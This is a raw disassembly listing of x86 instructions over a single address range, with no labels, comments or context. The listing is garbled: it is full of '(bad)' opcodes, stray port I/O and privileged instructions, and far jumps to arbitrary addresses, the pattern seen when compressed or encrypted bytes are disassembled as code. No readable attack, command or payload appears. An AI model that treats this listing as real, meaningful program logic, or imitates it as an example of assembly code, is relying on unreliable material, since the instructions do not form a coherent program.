  41470a:	pop    edi
  41470b:	loope  0x4146e8
  41470d:	mov    esp,0xb68914ec
  414712:	int3   
  414713:	mul    BYTE PTR [ecx]
  414715:	and    esp,edi
  414717:	jno    0x414782
  414719:	in     al,0x22
  41471b:	pop    ebx
  41471c:	(bad)  
  41471d:	xchg   edx,eax
  41471e:	fsubr  DWORD PTR [edi]
  414720:	and    BYTE PTR ds:0xc6378d05,bl
  414726:	das    
  414727:	icebp  
  414728:	pop    es
  414729:	loopne 0x4146d2
  41472b:	arpl   WORD PTR [eax-0xf],bx
  41472e:	pop    ecx
  41472f:	sub    al,0x98
  414731:	sbb    al,0xbd
  414733:	mov    dl,cl
  414735:	imul   ecx,DWORD PTR [ebx+0x465bf398],0x333e2c41
  41473f:	dec    eax
  414740:	xchg   esi,eax
  414741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414743:	addr16 dec edx
  414745:	pop    ds
  414746:	dec    ecx
  414747:	sbb    bh,BYTE PTR [ebp+0xcfc957e]
  41474d:	sub    bh,BYTE PTR ds:0x8315e0fc
  414753:	sahf   
  414754:	retf   0xb662
  414757:	rcl    edx,cl
  414759:	lock mov BYTE PTR [ecx+ebp*1],cl
  41475d:	lea    ecx,[ecx+eax*8-0x17]
  414761:	es jg  0x414745
  414764:	xchg   ebp,eax
  414765:	test   eax,0xa127072b
  41476a:	pop    edx
  41476b:	ja     0x4147d1
  41476d:	ss inc edi
  41476f:	leave  
  414770:	lahf   
  414771:	sti    
  414772:	inc    ebp
  414773:	lods   al,BYTE PTR ds:[esi]
  414774:	add    al,0x62
  414776:	pop    esi
  414777:	in     eax,dx
  414778:	add    dl,BYTE PTR [ecx+0x4f283125]
  41477e:	inc    ebp
  41477f:	lds    ebp,FWORD PTR [eax-0x22]
  414782:	sbb    eax,0x53b2ae00
  414787:	sbb    ah,0xed
  41478a:	or     DWORD PTR [edx],0xffffffaa
  41478d:	bound  edi,QWORD PTR [esi-0x49d0d571]
  414793:	lahf   
  414794:	sub    eax,0xe7227b2d
  414799:	mov    DWORD PTR [ecx+0x41],ecx
  41479c:	and    esi,DWORD PTR [ebx-0x14a5b3c2]
  4147a2:	rcr    DWORD PTR [eax],1
  4147a4:	mov    ds:0xfaa9003a,al
  4147a9:	repnz inc esi
  4147ab:	jbe    0x41478c
  4147ad:	cld    
  4147ae:	mov    ebx,0x74ed8d1c
  4147b3:	lea    ebp,[ecx+0x59e88651]
  4147b9:	je     0x414838
  4147bb:	or     al,0xd3
  4147bd:	xor    bh,ch
  4147bf:	loope  0x414766
  4147c1:	cmp    al,0x49
  4147c3:	sbb    esp,DWORD PTR [ecx]
  4147c5:	add    ebp,DWORD PTR [edi+0x40]
  4147c8:	or     DWORD PTR [esi],esp
  4147ca:	scas   al,BYTE PTR es:[edi]
  4147cb:	fdivrp st(5),st
  4147cd:	xor    BYTE PTR ds:0x94e459f2,dh
  4147d3:	inc    edx
  4147d4:	out    0xd,eax
  4147d6:	bound  esp,QWORD PTR [ebp+0x23]
  4147d9:	push   0xabb04cea
  4147de:	pop    esi
  4147df:	pop    esi
  4147e0:	fdiv   QWORD PTR [edx-0x7c28040d]
  4147e6:	or     DWORD PTR [edi],ecx
  4147e8:	push   ebx
  4147e9:	jbe    0x414837
  4147eb:	inc    ebp
  4147ec:	int3   
  4147ed:	jmpw   0xbfbc
  4147f1:	xor    dl,BYTE PTR [edx-0x474fab6e]
  4147f7:	xor    DWORD PTR [ecx-0x674b6228],0xffffff86
  4147fe:	push   ds
  4147ff:	sbb    al,0xdb
  414801:	pop    ebp
  414802:	add    DWORD PTR [esi+esi*4],0x6e
  414806:	cmp    al,0xea
  414808:	add    DWORD PTR [esi+0x66],ecx
  41480b:	push   ebx
  41480c:	add    DWORD PTR [ecx-0x19],ebp
  41480f:	in     al,0x80
  414811:	mov    ds:0x32b2118a,eax
  414816:	push   cs
  414817:	in     eax,dx
  414818:	inc    esp
  414819:	aaa    
  41481a:	mov    al,0x7
  41481c:	test   al,0x58
  41481e:	mov    esi,0x16d536d4
  414823:	retf   
  414824:	and    ebp,DWORD PTR [ecx]
  414826:	(bad)  
  414827:	mov    esi,0x30615eb6
  41482c:	sbb    al,BYTE PTR [esi-0x50]
  41482f:	aad    0x24
  414831:	test   al,0x1a
  414833:	ret    
  414834:	pop    ds
  414835:	jo     0x414890
  414837:	mov    eax,0x6e4736e5
  41483c:	mov    ah,0x1b
  41483e:	adc    edi,DWORD PTR [eax+0x14c74cd3]
  414844:	dec    ebx
  414845:	push   esp
  414846:	mov    edx,0x6b734cd6
  41484b:	mov    esp,0x6d46e286
  414850:	sub    BYTE PTR [edi-0x3],bh
  414853:	mov    ds:0xeeba007c,al
  414858:	lods   eax,DWORD PTR ds:[esi]
  414859:	sub    ebp,DWORD PTR [esi]
  41485b:	imul   ecx,esi,0xffffffc6
  41485e:	jmp    0xd3c7bf14
  414863:	rcl    BYTE PTR [ebx],1
  414865:	dec    ebp
  414866:	ficom  WORD PTR [edi]
  414868:	inc    ecx
  414869:	fisubr WORD PTR ds:0xdb244e43
  41486f:	mul    BYTE PTR [esi+ebp*4]
  414872:	and    BYTE PTR [ecx-0x7a2884d1],bh
  414878:	mov    dh,BYTE PTR [ebx]
  41487a:	xchg   edx,eax
  41487b:	in     eax,dx
  41487c:	div    DWORD PTR [esp+eiz*2+0x30]
  414880:	or     eax,0x124de6fa
  414885:	lock sub ecx,0x1115be93
  41488c:	mov    ebx,cs
  41488e:	and    eax,0xfbb15140
  414893:	fadd   st,st(6)
  414895:	sub    al,0x4e
  414897:	stc    
  414898:	jbe    0x41487a
  41489a:	je     0x4148d3
  41489c:	sub    ecx,0xb178fcfd
  4148a2:	jg     0x4148e3
  4148a4:	cmp    edx,DWORD PTR [edi]
  4148a6:	inc    edi
  4148a7:	add    ebp,DWORD PTR [eax-0x29]
  4148aa:	mov    esi,DWORD PTR [edi]
  4148ac:	fimul  WORD PTR [edi-0x68]
  4148af:	inc    eax
  4148b0:	add    esp,DWORD PTR [ebx+ebx*2+0x6ae3b6bc]
  4148b7:	addr16 out 0xf7,eax
  4148ba:	inc    esp
  4148bb:	adc    eax,0x587e3e80
  4148c0:	mov    ecx,DWORD PTR [ebx]
  4148c2:	or     eax,0x860f7612
  4148c7:	imul   ecx,DWORD PTR [ebx+0x4],0x9ad73d3c
  4148ce:	out    0x53,eax
  4148d0:	leave  
  4148d1:	mov    dl,0x40
  4148d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148d4:	cwde   
  4148d5:	sbb    eax,DWORD PTR [eax+0x4]
  4148d8:	(bad)  
  4148d9:	je     0x414861
  4148db:	push   ebp
  4148dc:	mov    edi,0x821b565
  4148e1:	push   esi
  4148e2:	xor    al,0x3a
  4148e4:	daa    
  4148e5:	pop    ds
  4148e6:	lds    edi,FWORD PTR [esi]
  4148e8:	jecxz  0x41489a
  4148ea:	sar    DWORD PTR [esi+0x14039e52],0xe4
  4148f1:	shl    DWORD PTR [edi],cl
  4148f3:	or     BYTE PTR [edx+esi*4+0x69f6f82f],ah
  4148fa:	out    dx,eax
  4148fb:	mov    esi,0x1c8bb20e
  414900:	jo     0x4148ff
  414902:	cs out dx,eax
  414904:	sbb    al,0x54
  414906:	or     BYTE PTR [eax+0x359cffe1],cl
  41490c:	cmp    BYTE PTR [ebx+0x702bd4bd],cl
  414912:	pop    es
  414913:	push   esp
  414914:	sub    al,0x7a
  414916:	pop    edi
  414917:	or     al,0x38
  414919:	sbb    esi,DWORD PTR [esi-0x26d47c70]
  41491f:	xchg   ebx,eax
  414920:	sahf   
  414921:	sub    al,BYTE PTR ds:0xd010921
  414927:	pusha  
  414928:	mov    BYTE PTR [ebx-0x68],ah
  41492b:	mov    bh,0x70
  41492d:	sub    BYTE PTR [ecx+esi*4],dh
  414930:	mov    ss,WORD PTR ds:0x244bb2b7
  414936:	and    DWORD PTR [eax-0x3b],0xffffffb1
  41493a:	xchg   edx,eax
  41493b:	xchg   ah,ah
  41493d:	dec    ebx
  41493e:	xchg   ebx,eax
  41493f:	clc    
  414940:	inc    ebx
  414941:	lods   eax,DWORD PTR ds:[esi]
  414942:	test   eax,0xb8aecb3b
  414947:	mov    edi,0x2827ea3e
  41494c:	mov    ch,0x53
  41494e:	retf   0x6e45
  414951:	jecxz  0x41499d
  414953:	sub    edx,ebx
  414955:	loop   0x4148df
  414957:	adc    dl,bh
  414959:	push   edx
  41495a:	cmc    
  41495b:	jno    0x4149bc
  41495d:	sbb    eax,0x8847d9b6
  414962:	pop    es
  414963:	dec    ebx
  414964:	xor    dh,BYTE PTR [ecx]
  414966:	mov    dh,dl
  414968:	sub    eax,0xeb67e3cc
  41496d:	mov    esp,0x63596056
  414972:	xchg   edx,eax
  414973:	pop    ebp
  414974:	call   0x93134475
  414979:	out    dx,al
  41497a:	mov    dh,0xe0
  41497c:	xlat   BYTE PTR ds:[ebx]
  41497d:	rcl    BYTE PTR [edi+0x459908],cl
  414983:	inc    eax
  414984:	aaa    
  414985:	xor    eax,0x96398b0f
  41498a:	dec    ecx
  41498b:	scas   eax,DWORD PTR es:[edi]
  41498c:	loope  0x414961
  41498e:	mov    ebp,DWORD PTR [ebp-0x3f4136fc]
  414994:	cli    
  414995:	inc    esp
  414996:	or     DWORD PTR [edx+edi*8+0x3d],eax
  41499a:	pop    ss
  41499b:	clc    
  41499c:	es and cl,bh
  41499f:	ror    BYTE PTR ds:0x540fd859,cl
  4149a5:	or     ecx,eax
  4149a7:	cmc    
  4149a8:	cmp    DWORD PTR [ebp-0x32],esi
  4149ab:	mov    dl,0x35
  4149ad:	jnp    0x414999
  4149af:	adc    al,0x73
  4149b1:	pop    edi
  4149b2:	ret    
  4149b3:	loopne 0x4149c7
  4149b5:	dec    eax
  4149b6:	adc    ebx,DWORD PTR [eax-0x635622a2]
  4149bc:	add    eax,0x4c0c6568
  4149c1:	int3   
  4149c2:	outs   dx,DWORD PTR ds:[esi]
  4149c3:	sub    BYTE PTR [edi],ah
  4149c5:	mov    al,0x5e
  4149c7:	ja     0x41495e
  4149c9:	data16 mov ah,0xff
  4149cc:	jnp    0x4149f8
  4149ce:	mov    dh,0xa2
  4149d0:	mov    esi,0x4c57ba44
  4149d5:	aam    0xc9
  4149d7:	push   esp
  4149d8:	iret   
  4149d9:	aaa    
  4149da:	push   ecx
  4149db:	push   es
  4149dc:	loopne 0x4149b4
  4149de:	fnstsw WORD PTR [ecx-0x4d]
  4149e1:	(bad)  
  4149e2:	div    DWORD PTR [esi-0x40e9e484]
  4149e8:	aam    0x3e
  4149ea:	push   esp
  4149eb:	cmc    
  4149ec:	cld    
  4149ed:	iret   
  4149ee:	test   al,0xc6
  4149f0:	add    esp,DWORD PTR [eax+0x61e00d27]
  4149f6:	imul   BYTE PTR [ebx-0x1e]
  4149f9:	lods   eax,DWORD PTR ds:[esi]
  4149fa:	bound  ecx,QWORD PTR [ebx-0x9]
  4149fd:	xchg   ebx,eax
  4149fe:	xor    bl,BYTE PTR [edx-0x4ed1cc05]
  414a04:	pop    ebp
  414a05:	pop    es
  414a06:	mov    edx,0x59c3184f
  414a0b:	mov    WORD PTR [esi+0x11],?
  414a0e:	mov    esp,0x97e9600e
  414a13:	es inc eax
  414a15:	inc    ecx
  414a16:	cmc    
  414a17:	xlat   BYTE PTR ds:[ebx]
  414a18:	dec    edx
  414a19:	addr16 in eax,0x92
  414a1c:	dec    esp
  414a1e:	pop    esi
  414a1f:	stc    
  414a20:	fimul  WORD PTR [ecx-0x756ac3d2]
  414a26:	test   al,0xea
  414a28:	mov    dh,BYTE PTR [ecx-0x60]
  414a2b:	(bad)  
  414a2c:	je     0x414a3b
  414a2e:	xor    DWORD PTR [eax+0x59f67ed2],eax
  414a34:	jg     0x414a79
  414a36:	mov    gs,ecx
  414a38:	fld    DWORD PTR [ebp+eiz*2+0x364a0b]
  414a3f:	pop    es
  414a40:	cmp    edx,DWORD PTR [ebx]
  414a42:	mov    eax,0x94250c3a
  414a47:	mov    esi,0x366e1de1
  414a4c:	nop
  414a4d:	inc    edx
  414a4e:	inc    eax
  414a4f:	test   edx,0x879ded3d
  414a55:	retf   0xb68f
  414a58:	dec    edx
  414a5a:	data16 mov al,ds:0xb9a5977
  414a60:	push   0x11
  414a62:	dec    esp
  414a63:	ins    BYTE PTR es:[edi],dx
  414a64:	cmp    BYTE PTR [ecx+esi*8],al
  414a67:	lea    ebx,[edx]
  414a69:	les    esp,FWORD PTR [edi-0x31]
  414a6c:	pop    eax
  414a6d:	mov    ebx,DWORD PTR [eax+0x71d03a41]
  414a73:	inc    ebx
  414a74:	sub    eax,0x7c6b5160
  414a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a7a:	call   0x34ef:0x255186af
  414a81:	mov    ss,WORD PTR [ebx-0x6ce55d65]
  414a87:	hlt    
  414a88:	scas   eax,DWORD PTR es:[edi]
  414a89:	pop    ecx
  414a8a:	add    edx,DWORD PTR [edi-0x2f]
  414a8d:	push   0x53
  414a8f:	jmp    0x81ead548
  414a94:	pop    ebx
  414a95:	jnp    0x414ab7
  414a97:	(bad)  
  414a98:	push   edi
  414a99:	retf   0xb9ff
  414a9c:	sbb    eax,0x9498787c
  414aa1:	ror    BYTE PTR [ebx-0x6f324ac],cl
  414aa7:	popf   
  414aa8:	pop    ebx
  414aa9:	cli    
  414aaa:	mov    WORD PTR [ebp-0x4f005ef2],ds
  414ab0:	sbb    BYTE PTR [ebx+0x3],ah
  414ab3:	cmp    eax,0xed26e310
  414ab8:	(bad)  
  414ab9:	in     al,0xb3
  414abb:	push   ss
  414abc:	in     al,dx
  414abd:	pop    esi
  414abe:	xchg   ebp,eax
  414abf:	xor    DWORD PTR [edx-0x4],edx
  414ac2:	push   esi
  414ac3:	data16 fist DWORD PTR [ebx+edi*8-0x4e95b276]
  414acb:	ret    0x840c
  414ace:	fdivr  st(0),st
  414ad0:	out    dx,al
  414ad1:	mov    edx,0xf3766a0a
  414ad6:	jecxz  0x414a77
  414ad8:	inc    esi
  414ad9:	in     eax,dx
  414ada:	test   eax,0x16820753
  414adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae0:	repnz sub cl,BYTE PTR [ebp-0x3e]
  414ae4:	mov    dl,0xe3
  414ae6:	popf   
  414ae7:	loopne 0x414a98
  414ae9:	jmp    FWORD PTR [eax-0x3f4b22e3]
  414aef:	and    DWORD PTR [esi],ebx
  414af1:	xchg   bh,dl
  414af3:	xor    edi,DWORD PTR [edx+0x2831e967]
  414af9:	xor    eax,0x44527aed
  414afe:	ins    DWORD PTR es:[edi],dx
  414aff:	pop    esi
  414b00:	cli    
  414b01:	push   ecx
  414b02:	(bad)  
  414b04:	xchg   edi,eax
  414b05:	fs xchg ebp,eax
  414b07:	and    ecx,edi
  414b09:	aad    0xb6
  414b0b:	push   esi
  414b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0d:	adc    edx,DWORD PTR [edi]
  414b0f:	test   al,0xf8
  414b11:	push   edi
  414b12:	cld    
  414b13:	jbe    0x414b43
  414b15:	xchg   esp,eax
  414b16:	test   BYTE PTR [edx],bh
  414b18:	sub    eax,0xd881675e
  414b1d:	out    0xea,al
  414b1f:	stc    
  414b20:	xor    DWORD PTR [edi+0x25e0be73],esi
  414b26:	pop    ebp
  414b27:	dec    edx
  414b28:	jle    0x414ac7
  414b2a:	cmp    al,0xe6
  414b2c:	xor    eax,eax
  414b2e:	ja     0x414ab7
  414b30:	dec    edi
  414b31:	inc    ecx
  414b32:	iret   
  414b33:	xor    DWORD PTR [edx-0x73],eax
  414b36:	adc    DWORD PTR [esi],edx
  414b38:	icebp  
  414b39:	out    dx,eax
  414b3a:	neg    BYTE PTR [ecx+0x4e]
  414b3d:	lods   eax,DWORD PTR ds:[esi]
  414b3e:	or     eax,0xe063ca4f
  414b43:	xchg   esp,eax
  414b44:	fwait
  414b45:	ins    BYTE PTR es:[edi],dx
  414b46:	loop   0x414ad3
  414b48:	dec    edx
  414b49:	fld    TBYTE PTR [esi+ebp*4]
  414b4c:	push   cs
  414b4d:	push   0xa3f6be1c
  414b52:	std    
  414b53:	int3   
  414b54:	out    dx,al
  414b55:	bound  ebp,QWORD PTR [edx+0x7]
  414b58:	push   cs
  414b59:	push   ss
  414b5a:	push   edx
  414b5b:	adc    bh,BYTE PTR [ebp+0x30]
  414b5e:	nop
  414b5f:	loope  0x414b9f
  414b61:	lods   al,BYTE PTR ds:[esi]
  414b62:	sahf   
  414b63:	sbb    eax,0x733b2439
  414b68:	(bad)  
  414b69:	ins    DWORD PTR es:[edi],dx
  414b6a:	lahf   
  414b6b:	iret   
  414b6c:	mov    ds:0x60bc3d07,al
  414b71:	mov    al,0xe3
  414b73:	xor    al,0x70
  414b75:	dec    esi
  414b76:	sbb    BYTE PTR [edi],bl
  414b78:	test   eax,0xf82b9776
  414b7d:	pop    es
  414b7e:	das    
  414b7f:	imul   esp,DWORD PTR [ecx+ebx*1-0x41],0xffffffbf
  414b84:	stc    
  414b85:	or     eax,0x7c2cba
  414b8a:	out    0xe5,al
  414b8c:	int3   
  414b8d:	ins    DWORD PTR es:[edi],dx
  414b8e:	mov    eax,0xca0fc14c
  414b93:	fistp  WORD PTR ds:0x8301f72c
  414b99:	loopne 0x414be2
  414b9b:	je     0x414b8c
  414b9d:	add    eax,0x40c346b9
  414ba2:	or     bh,BYTE PTR [edi]
  414ba4:	pushf  
  414ba5:	sub    BYTE PTR [esi-0x41600c04],ah
  414bab:	js     0x414bf0
  414bad:	jge    0x414bff
  414baf:	jmp    0xa8060cd9
  414bb4:	jno    0x414b5d
  414bb6:	dec    ecx
  414bb7:	sub    esp,0xffffffdf
  414bba:	rol    BYTE PTR [edx],cl
  414bbc:	daa    
  414bbd:	es inc ebx
  414bbf:	cmp    eax,0x4544e23e
  414bc4:	shl    BYTE PTR [esp+ebx*4-0x3aedc228],0x50
  414bcc:	test   al,0xe8
  414bce:	shl    BYTE PTR [ebx],0x84
  414bd1:	mov    al,ds:0x458f2205
  414bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bd7:	mov    ebx,0xd4833e8d
  414bdc:	retf   0xaf3f
  414bdf:	jle    0x414c01
  414be1:	and    BYTE PTR [ecx+0x371e02cc],bl
  414be7:	retf   
  414be8:	loopne 0x414c1a
  414bea:	xor    esp,DWORD PTR [ebx-0x25]
  414bed:	std    
  414bee:	mov    dh,0xc8
  414bf0:	mov    DWORD PTR [ebx+0x6f],ecx
  414bf3:	mov    ds:0xed41f08a,eax
  414bf8:	hlt    
  414bf9:	pop    eax
  414bfa:	popf   
  414bfb:	loope  0x414c72
  414bfd:	xchg   BYTE PTR [esp+edx*2],bl
  414c00:	mov    cl,0x8f
  414c02:	stos   BYTE PTR es:[edi],al
  414c03:	sub    eax,0xa597a42e
  414c08:	adc    eax,0xebffce1b
  414c0d:	inc    edx
  414c0e:	pop    esp
  414c0f:	cmp    DWORD PTR [edx+0x609ca001],eax
  414c15:	add    DWORD PTR [eax+0x165fcec5],esi
  414c1b:	ret    0x5e22
  414c1e:	xor    dh,BYTE PTR [esi+edi*2-0x77]
  414c22:	pop    es
  414c23:	jmp    0xbee2539a
  414c28:	inc    esi
  414c29:	and    ebp,eax
  414c2b:	int    0xcd
  414c2d:	jne    0x414c00
  414c2f:	add    eax,0xc6bc172a
  414c34:	pop    es
  414c35:	fadd   DWORD PTR [esi-0x69]
  414c38:	pop    ecx
  414c39:	push   esi
  414c3a:	mov    edi,0xcd1bbf58
  414c3f:	mov    cs:0x475ac878,al
  414c45:	ret    
  414c46:	(bad)
  414c49:	dec    ecx
  414c4a:	adc    dh,BYTE PTR ds:0x9394692d
  414c50:	sbb    edi,DWORD PTR [ebx+0x5f]
  414c53:	mov    ds:0xcb0700e7,eax
  414c58:	xchg   BYTE PTR [esi],bh
  414c5a:	xor    DWORD PTR [ebp+ebx*8-0x56],eax
  414c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c5f:	fs add eax,0x8b3c2216
  414c65:	lods   al,BYTE PTR ds:[esi]
  414c66:	bound  ebp,QWORD PTR [ebp+0x42]
  414c69:	sub    al,0x9b
  414c6b:	jle    0x414ce9
  414c6d:	sub    dh,BYTE PTR [ebx+0x72afb94f]
  414c73:	rcl    BYTE PTR [esi+edi*8-0x13],0xdd
  414c78:	push   0x12
  414c7a:	stos   BYTE PTR es:[edi],al
  414c7b:	mov    dh,BYTE PTR [ebx+0x334c37b3]
  414c81:	mov    edx,0x1816b4f4
  414c86:	xchg   edi,eax
  414c87:	sbb    eax,DWORD PTR [edx]
  414c89:	jmp    0x1497bc3b
  414c8e:	in     al,0xb6
  414c90:	lods   eax,DWORD PTR ds:[esi]
  414c91:	jmp    0x414cd5
  414c93:	dec    ebx
  414c94:	imul   ebx,DWORD PTR [ebx],0xffffffe7
  414c97:	dec    esp
  414c98:	and    eax,0x6919beb5
  414c9d:	add    DWORD PTR [eax+0x4b],esi
  414ca0:	add    BYTE PTR [ebx],ah
  414ca2:	pop    esp
  414ca3:	add    eax,0xeac81e01
  414ca8:	outs   dx,BYTE PTR ds:[esi]
  414ca9:	inc    ebp
  414caa:	in     al,0x5d
  414cac:	test   eax,0xb92e9e96
  414cb1:	xchg   esi,eax
  414cb2:	in     al,0x44
  414cb4:	mov    ds:0x2b946f83,eax
  414cb9:	std    
  414cba:	cmp    DWORD PTR [esi-0x156e1098],edi
  414cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc1:	adc    esi,DWORD PTR [esi+ebx*2]
  414cc4:	cli    
  414cc5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cc7:	aas    
  414cc8:	repnz retf 
  414cca:	mov    ch,0xa9
  414ccc:	fsubr  DWORD PTR [eax+0xa]
  414ccf:	sub    ecx,esp
  414cd1:	sbb    BYTE PTR [eax],0xce
  414cd4:	int    0x14
  414cd6:	outs   dx,DWORD PTR ds:[esi]
  414cd7:	jmp    0x414c68
  414cd9:	cmp    esi,eax
  414cdb:	xlat   BYTE PTR ds:[ebx]
  414cdc:	(bad)  
  414cdd:	lods   al,BYTE PTR ds:[esi]
  414cde:	push   esi
  414cdf:	lods   eax,DWORD PTR ds:[esi]
  414ce0:	cmp    edx,esp
  414ce2:	cmp    al,0x80
  414ce4:	je     0x414cd9
  414ce6:	aam    0xf5
  414ce8:	push   ecx
  414ce9:	or     eax,0xe59ab545
  414cee:	in     eax,0x6a
  414cf0:	daa    
  414cf1:	cmc    
  414cf2:	dec    edi
  414cf3:	sbb    DWORD PTR [ecx-0x1d92e591],ebp
  414cf9:	jle    0x414c97
  414cfb:	xor    esi,DWORD PTR [esi-0xc]
  414cfe:	test   eax,0x482f49a8
  414d03:	loop   0x414c90
  414d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d06:	xchg   ebp,eax
  414d07:	add    BYTE PTR [eax],ah
  414d09:	jne    0x414ca8
  414d0b:	cld    
  414d0c:	out    dx,al
  414d0d:	pop    ss
  414d0e:	out    dx,eax
  414d0f:	dec    ebx
  414d10:	jecxz  0x414ce6
  414d12:	pmaddwd mm3,QWORD PTR [eax]
  414d15:	pushf  
  414d16:	mov    ah,0x45
  414d18:	inc    esi
  414d19:	call   0xac74:0xfd2a87ae
  414d20:	xchg   edx,eax
  414d21:	dec    ebp
  414d22:	into   
  414d23:	add    dl,BYTE PTR [ebp+0x23ddf5d9]
  414d29:	inc    ecx
  414d2a:	add    DWORD PTR [esi+0x49],edi
  414d2d:	xor    al,0xba
  414d2f:	mov    ch,0x72
  414d31:	push   0x16b85426
  414d36:	cmp    al,0xdf
  414d38:	jae    0x414cfa
  414d3a:	xchg   esi,eax
  414d3b:	mov    eax,0x25e58d4e
  414d40:	jle    0x414d71
  414d42:	mov    eax,0x46922aac
  414d47:	stc    
  414d48:	mov    eax,cs:0x7ca18d04
  414d4e:	sub    al,0x28
  414d50:	dec    bl
  414d52:	ret    
  414d53:	test   DWORD PTR [ecx],esp
  414d55:	ss mov esp,0x3986bd03
  414d5b:	jo     0x414d21
  414d5d:	xor    DWORD PTR [eax],esp
  414d5f:	xchg   ebx,eax
  414d60:	(bad)  
  414d61:	jmp    0x261a:0x2dfa21ec
  414d68:	jecxz  0x414dda
  414d6a:	or     al,0xba
  414d6c:	dec    esp
  414d6d:	loopne 0x414d4a
  414d6f:	icebp  
  414d70:	add    eax,0x63432cec
  414d75:	ss js  0x414db5
  414d78:	adc    DWORD PTR [eax+0x32326180],edx
  414d7e:	push   es
  414d7f:	stos   DWORD PTR es:[edi],eax
  414d80:	cs fdivrp st(7),st
  414d83:	mov    esi,0xc24811f
  414d88:	dec    esp
  414d89:	pop    ecx
  414d8a:	and    al,0x2f
  414d8c:	jle    0x414e08
  414d8e:	lods   al,BYTE PTR fs:[esi]
  414d90:	in     eax,dx
  414d91:	jmp    0x414e08
  414d93:	scas   eax,DWORD PTR es:[edi]
  414d94:	hlt    
  414d95:	pop    edi
  414d96:	jne    0x414d7a
  414d98:	sbb    DWORD PTR [ebx+0x14],esp
  414d9b:	test   cl,cl
  414d9d:	mov    edi,0x8480e962
  414da2:	inc    eax
  414da3:	cmp    DWORD PTR cs:[ebx+0x5ead306d],ecx
  414daa:	bound  esi,QWORD PTR [ebp-0xc26ef08]
  414db0:	inc    esp
  414db1:	jp     0x414d53
  414db3:	popa   
  414db4:	pop    ecx
  414db5:	or     eax,DWORD PTR [esi-0x5f]
  414db8:	dec    edx
  414db9:	test   dh,dl
  414dbb:	dec    ebp
  414dbc:	sub    DWORD PTR [edx+0x66],edx
  414dbf:	xor    eax,0xda18a6ee
  414dc4:	push   ecx
  414dc5:	out    0xd2,al
  414dc7:	test   eax,0x16af397
  414dcc:	in     al,dx
  414dcd:	push   cs
  414dce:	loopne 0x414e3e
  414dd0:	xor    ebp,esp
  414dd2:	xchg   ebp,eax
  414dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd4:	ret    
  414dd5:	jmp    0xbde8:0x3cfe87bf
  414ddc:	jge    0x414da2
  414dde:	cmc    
  414ddf:	out    0x1,al
  414de1:	lea    ebx,[edx+0x62]
  414de4:	sahf   
  414de5:	mov    ?,edx
  414de7:	call   0x6ebbab93
  414dec:	mov    ebx,0xdc7e0c2
  414df1:	in     eax,0x8d
  414df3:	int    0xf6
  414df5:	repz inc ecx
  414df7:	add    ecx,DWORD PTR [esi+0x301041a6]
  414dfd:	psrlq  mm0,mm0
  414e00:	repnz lods al,BYTE PTR ds:[esi]
  414e02:	add    ebp,DWORD PTR [edi+edi*2+0x73]
  414e06:	arpl   WORD PTR [eax+0x4c],ax
  414e09:	hlt    
  414e0a:	repz inc ecx
  414e0c:	pop    ds
  414e0d:	mov    esi,0xf48d5812
  414e12:	stos   DWORD PTR es:[edi],eax
  414e13:	mov    ebp,0x55c82ad0
  414e18:	mov    cl,0xb7
  414e1a:	mov    DWORD PTR [edi],edi
  414e1c:	push   0x5f3eab26
  414e21:	retf   0x4c15
  414e24:	in     eax,dx
  414e25:	mov    ebp,DWORD PTR [eax+0x67]
  414e28:	das    
  414e29:	xor    eax,edx
  414e2b:	mov    edx,0x56b0ff53
  414e30:	js     0x414ea8
  414e32:	or     DWORD PTR [edx+edx*2-0x7fdaf01f],0xa48f429e
  414e3d:	sbb    BYTE PTR [ebp-0x29e3f25c],al
  414e43:	xchg   esi,eax
  414e44:	fisttp WORD PTR [ebp-0x4f4eecad]
  414e4a:	pop    ebp
  414e4b:	mov    bh,0xcb
  414e4d:	pop    ebp
  414e4e:	in     al,dx
  414e4f:	push   eax
  414e50:	imul   eax,DWORD PTR [eax+0x26],0x67
  414e54:	div    ecx
  414e56:	push   eax
  414e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e58:	mov    edi,0x70b4eba3
  414e5d:	lods   eax,DWORD PTR ds:[esi]
  414e5e:	cmc    
  414e5f:	xor    ecx,DWORD PTR [ebp+0x7f0b6f08]
  414e65:	pusha  
  414e66:	push   ds
  414e67:	mov    ebx,ebx
  414e69:	outs   dx,BYTE PTR ds:[esi]
  414e6a:	xor    BYTE PTR [edx],cl
  414e6c:	mov    bh,0xe9
  414e6e:	xor    al,0x67
  414e70:	cs (bad) 
  414e72:	mov    edi,0x6cc0383f
  414e77:	xchg   esp,eax
  414e78:	mov    BYTE PTR [ecx+0x3d],dh
  414e7b:	leave  
  414e7c:	aam    0x69
  414e7e:	test   eax,edi
  414e80:	inc    DWORD PTR [edx+esi*1]
  414e83:	push   eax
  414e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e85:	(bad)  
  414e86:	jbe    0x414eb0
  414e88:	adc    bl,bh
  414e8a:	jno    0x414e82
  414e8c:	pop    esi
  414e8d:	clc    
  414e8e:	gs dec eax
  414e90:	xchg   edi,eax
  414e91:	jl     0x414e30
  414e93:	mov    ch,0xe2
  414e95:	push   eax
  414e96:	mov    edx,0x3829be67
  414e9b:	xor    BYTE PTR ds:0x2e81acbd,0x58
  414ea2:	dec    esi
  414ea3:	add    bh,BYTE PTR [ebp-0x4d]
  414ea6:	call   0x8904acac
  414eab:	jno    0x414eb6
  414ead:	jmp    0xf58583ff
  414eb2:	xchg   BYTE PTR [edi],cl
  414eb4:	outs   dx,DWORD PTR es:[esi]
  414eb6:	xor    edx,ecx
  414eb8:	mov    eax,0xbe453d6b
  414ebd:	cld    
  414ebe:	and    BYTE PTR [ebx+0x5d],0xe2
  414ec2:	popa   
  414ec3:	mov    ebx,0x5b246e45
  414ec8:	repz (bad) 
  414ecb:	pop    ss
  414ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
